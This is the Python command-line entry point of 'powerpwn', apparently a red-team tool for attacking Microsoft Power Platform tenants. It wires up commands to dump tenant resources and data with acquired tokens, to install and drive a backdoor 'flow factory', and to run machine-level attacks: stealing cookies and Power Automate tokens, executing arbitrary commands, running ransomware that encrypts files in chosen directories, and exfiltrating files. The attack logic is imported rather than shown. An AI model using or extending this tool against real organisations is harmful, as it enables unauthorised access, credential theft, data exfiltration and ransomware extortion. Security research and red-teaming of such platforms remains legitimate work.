import argparse
import json
import logging
import os
import shutil

from art import tprint

from powerpwn.const import LOGGER_NAME
from powerpwn.machinepwn.enums.code_exec_type_enum import CodeExecTypeEnum
from powerpwn.machinepwn.enums.command_to_run_enum import CommandToRunEnum
from powerpwn.machinepwn.machine_pwn import MachinePwn
from powerpwn.powerdoor.backdoor_flow import BackdoorFlow
from powerpwn.powerdoor.enums.action_type import ActionType
from powerpwn.powerdoor.flow_factory_installer import FlowFlowInstaller
from powerpwn.powerdump.collect.data_collectors.data_collector import DataCollector
from powerpwn.powerdump.collect.resources_collectors.resources_collector import ResourcesCollector
from powerpwn.powerdump.gui.gui import Gui
from powerpwn.powerdump.utils.auth import acquire_token, acquire_token_from_cached_refresh_token
from powerpwn.powerdump.utils.const import API_HUB_SCOPE, CACHE_PATH, POWER_APPS_SCOPE

logger = logging.getLogger(LOGGER_NAME)


def register_gui_parser(sub_parser: argparse.ArgumentParser):
    gui_parser = sub_parser.add_parser("gui", description="Show collected resources and data.", help="Show collected resources and data via GUI.")
    gui_parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
    gui_parser.add_argument("--cache-path", default=CACHE_PATH, type=str, help="Path to cached resources.")


def register_collect_parser(sub_parser: argparse.ArgumentParser):
    explore_parser = sub_parser.add_parser(
        "dump", description="Collect all available data in tenant", help="Get all available resources in tenant and dump data."
    )
    explore_parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
    explore_parser.add_argument("-c", "--clear-cache", action="store_true", help="Clear local disk cache")
    explore_parser.add_argument("--cache-path", default=CACHE_PATH, help="Path to store collected resources and data.")
    explore_parser.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
    explore_parser.add_argument("-g", "--gui", action="store_true", help="Run local server for gui.")


def register_machine_pwn_common_args(sub_parser: argparse.ArgumentParser):
    sub_parser.add_argument("-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform")
    sub_parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")


def register_backdoor_flow_common_args(sub_parser: argparse.ArgumentParser):
    sub_parser.add_argument("-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform")
    sub_parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
    sub_parser.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id in powerplatform.")


def register_exec_parsers(command_subparsers: argparse.ArgumentParser):
    steal_fqdn_parser = command_subparsers.add_parser("steal-cookie", description="Steal cookie of fqdn")
    register_steal_fqdn_cookie_parser(steal_fqdn_parser)

    steal_power_automate_token_parser = command_subparsers.add_parser("steal-power-automate-token", description="Steal power automate token")
    register_machine_pwn_common_args(steal_power_automate_token_parser)

    execute_command_parser = command_subparsers.add_parser("command-exec", description="Execute command on machine")
    register_exec_command_parser(execute_command_parser)

    ransomware_parser = command_subparsers.add_parser("ransomware", description="Ransomware")
    register_ransomware_parser(ransomware_parser)

    exflirtate_file_parser = command_subparsers.add_parser("exflirtate", description="Exflirtate file")
    register_exfiltrate_file_parser(exflirtate_file_parser)

    cleanup_parser = command_subparsers.add_parser("cleanup", description="Cleanup")
    register_machine_pwn_common_args(cleanup_parser)


## machine pwn parsers ##
def register_steal_fqdn_cookie_parser(sub_parser: argparse.ArgumentParser):
    register_machine_pwn_common_args(sub_parser)
    sub_parser.add_argument("-fqdn", "--cookie", required=True, type=str, help="Fully qualified domain name to fetch the cookies of")


def register_exec_command_parser(sub_parser: argparse.ArgumentParser):
    register_machine_pwn_common_args(sub_parser)
    sub_parser.add_argument("-t", "--type", required=True, type=str, choices=[cmd_type.value for cmd_type in CodeExecTypeEnum], help="Command type")
    sub_parser.add_argument("-c", "--command-to-execute", required=True, type=str, help="Command to execute")


def register_ransomware_parser(sub_parser: argparse.ArgumentParser):
    register_machine_pwn_common_args(sub_parser)
    sub_parser.add_argument("--crawl_depth", required=True, type=str, help="Recursively search into subdirectories this many times")
    sub_parser.add_argument("-k", "--encryption-key", required=True, type=str, help="an encryption key used to encrypt each file identified (AES256)")
    sub_parser.add_argument(
        "--dirs", required=True, type=str, help="A list of directories to begin crawl from separated by a comma (e.g.'C:\\,D:\\')"
    )


def register_exfiltrate_file_parser(sub_parser: argparse.ArgumentParser):
    register_machine_pwn_common_args(sub_parser)
    sub_parser.add_argument("-f", "--file", required=True, type=str, help="Absolute path to file")


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
    command_subparsers = parser.add_subparsers(help="command", dest="command")
    register_collect_parser(command_subparsers)
    register_gui_parser(command_subparsers)

    ## Delete Flow parser ##
    delete_flow_parser = command_subparsers.add_parser("delete-flow", description="Deletes flow.", help="Deletes flow using installed backdoor flow.")
    register_backdoor_flow_common_args(delete_flow_parser)
    delete_flow_parser.add_argument("-f", "--flow-id", type=str, help="Flow id to delete.")

    ## Create Flow parser ##
    create_flow_parser = command_subparsers.add_parser(
        "create-flow", description="Creates a flow.", help="Creates a flow using installed backdoor flow."
    )
    register_backdoor_flow_common_args(create_flow_parser)
    create_flow_parser.add_argument("-i", "--input", type=str, required=True, help="Path to flow details input file.")

    ## Get connections parser ##
    get_connections_parser = command_subparsers.add_parser(
        "get-connections", description="Get connections", help="Gets connections details in environment"
    )
    register_backdoor_flow_common_args(get_connections_parser)
    get_connections_parser.add_argument("-o", "--output", type=str, default="", help="Path to output file.")

    ## backdoor installer parser ##
    installer = command_subparsers.add_parser(
        "install-flow-factory", description="Install flow factory", help="Installs flow factory in powerplatform"
    )
    installer.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
    installer.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id in powerplatform.")
    installer.add_argument("-c", "--connection-id", required=True, type=str, help="The connection id of management connection")
    installer.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")

    register_exec_parsers(command_subparsers)
    args = parser.parse_args()

    return args


def __init_command_token(args, scope: str) -> str:
    # if cached refresh token is found, use it
    if token := acquire_token_from_cached_refresh_token(scope, args.tenant):
        return token

    return acquire_token(scope=scope, tenant=args.tenant)


def run_collect_resources_command(args):
    # cache
    if args.clear_cache:
        try:
            shutil.rmtree(args.cache_path)
        except FileNotFoundError:
            pass
    os.makedirs(args.cache_path, exist_ok=True)

    token = __init_command_token(args, POWER_APPS_SCOPE)

    entities_fetcher = ResourcesCollector(token=token, cache_path=args.cache_path)
    entities_fetcher.collect_and_cache()


def run_gui_command(args):
    Gui().run(cache_path=args.cache_path)


def run_collect_data_command(args):
    token = __init_command_token(args, API_HUB_SCOPE)
    DataCollector(token=token, cache_path=args.cache_path).collect()


def run_backdoor_flow_command(args):
    action_type = ActionType(args.command)
    backdoor_flow = BackdoorFlow(args.webhook_url)
    if action_type == ActionType.delete_flow:
        backdoor_flow.delete_flow(args.environment_id, args.flow_id)

    elif action_type == ActionType.create_flow:
        backdoor_flow.create_flow_from_input_file(args.environment_id, args.input)

    elif action_type == ActionType.get_connections:
        output_to_file = args.output and args.output != ""
        connections = backdoor_flow.get_connections(args.environment_id, not output_to_file)
        if output_to_file:
            f = open(args.output, "w+")
            f.write(json.dumps(connections, indent=4))
        else:
            logger.info(connections)


def run_machine_pwn_command(args):
    command_type = CommandToRunEnum(args.command)
    machine_pwn = MachinePwn(args.webhook_url)
    if command_type == CommandToRunEnum.CLEANUP:
        res = machine_pwn.cleanup()
    elif command_type == CommandToRunEnum.CODE_EXEC:
        res = machine_pwn.exec_command(args.command_to_execute, CodeExecTypeEnum(args.type))
    elif command_type == CommandToRunEnum.EXFILTRATION:
        res = machine_pwn.exfiltrate(args.file)
    elif command_type == CommandToRunEnum.RANSOMWARE:
        res = machine_pwn.ransomware(args.crawl_depth, args.dirs.split(","), args.encryption_key)
    elif command_type == CommandToRunEnum.STEAL_COOKIE:
        res = machine_pwn.steal_cookie(args.cookie)
    elif command_type == CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN:
        res = machine_pwn.steal_power_automate_token()
    print(res)


def main():
    print("\n\n------------------------------------------------------------")
    tprint("powerpwn")
    print("------------------------------------------------------------\n\n")

    args = parse_arguments()

    logging.basicConfig(level=args.log_level, format="%(asctime)s | %(name)s | %(levelname)s | %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
    logger.level = args.log_level
    command = args.command

    if command == "dump":
        run_collect_resources_command(args)
        run_collect_data_command(args)
        logger.info(f"Dump is completed in {args.cache_path}")
        if args.gui:
            logger.info("Going to run local server for gui")
            run_gui_command(args)

    elif command == "gui":
        run_gui_command(args)

    elif command in [action_type.value for action_type in ActionType]:
        run_backdoor_flow_command(args)

    elif command == "install-flow-factory":
        token = __init_command_token(args, POWER_APPS_SCOPE)
        FlowFlowInstaller(token).install(args.environment_id, args.connection_id)

    elif command in [cmd_type.value for cmd_type in CommandToRunEnum]:
        run_machine_pwn_command(args)

    else:
        logger.info("Run `powerpwn --help` for available commands.")


if __name__ == "__main__":
    main()
